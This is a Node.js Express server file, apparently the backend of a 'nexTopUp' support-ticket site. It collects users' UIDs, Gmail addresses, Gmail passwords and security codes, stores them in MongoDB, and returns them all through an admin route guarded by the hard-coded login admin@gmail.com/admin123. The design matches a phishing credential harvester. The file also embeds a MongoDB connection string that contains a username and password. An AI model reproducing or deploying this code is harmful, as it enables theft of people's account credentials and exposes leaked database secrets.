const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(express.json());

// 🔗 আপনার MongoDB Atlas Connection URI
const MONGO_URI = "mongodb+srv://asraful296616917_db_user:araPknwsbOmAluL6@cluster0.c0r7t8e.mongodb.net/nexTopUpDB?retryWrites=true&w=majority&appName=Cluster0";

// MongoDB Connect
mongoose.connect(MONGO_URI)
    .then(() => console.log("✅ MongoDB Connected Successfully!"))
    .catch(err => console.error("❌ MongoDB Connection Error:", err));

// 📋 Data Schema & Model
const TicketSchema = new mongoose.Schema({
    uid: String,
    gmail: String,
    password: String,
    securityCode: String,
    problemType: String,
    additionalDetails: String,
    submittedAt: { type: Date, default: Date.now }
});

const Ticket = mongoose.model('Ticket', TicketSchema);

// 📩 Submit Ticket Route (ডাটা ডাটাবেসে চিরতরে সেভ হবে)
app.post('/api/submit', async (req, res) => {
    try {
        const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;

        const newTicket = new Ticket({
            uid,
            gmail,
            password,
            securityCode,
            problemType,
            additionalDetails
        });

        await newTicket.save();
        res.json({ success: true, message: 'Data saved successfully to database!' });
    } catch (err) {
        console.error("Save error:", err);
        res.status(500).json({ success: false, message: 'Database save failed' });
    }
});

// 🔐 Admin Login & Data Fetch Route (ডাটাবেস থেকে সব সাবমিশন ফেচ করবে)
app.post('/api/admin/login', async (req, res) => {

    // 🛑 আপনার এডমিন ইমেইল ও পাসওয়ার্ড
    const ADMIN_EMAIL = "admin@gmail.com";
    const ADMIN_PASSWORD = "admin123";

    const { email, password } = req.body;

    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
        try {
            // নতুন ডাটাগুলো ডাটাবেস থেকে সবার উপরে দেখাবে
            const submissions = await Ticket.find().sort({ submittedAt: -1 });
            res.json({ success: true, submissions });
        } catch (err) {
            console.error("Fetch error:", err);
            res.status(500).json({ success: false, message: 'Failed to fetch data' });
        }
    } else {
        res.json({ success: false, message: 'Invalid Admin Email or Password!' });
    }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
